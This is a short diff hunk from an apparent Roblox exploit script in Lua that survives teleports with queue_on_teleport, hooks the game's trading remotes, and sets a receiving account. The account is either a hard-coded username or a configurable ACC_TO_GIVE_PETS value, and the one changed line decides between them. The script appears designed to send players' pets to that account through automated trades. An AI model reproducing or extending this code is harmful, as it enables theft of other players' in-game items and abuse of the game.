@@ -1004,7 +1004,7 @@ queue_on_teleport([==[
 	end)
         local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
-	local PLR = game.Players:FindFirstChild'sowhatsatimberland' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+	local PLR = isme and game.Players:FindFirstChild'sowhatsatimberland' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
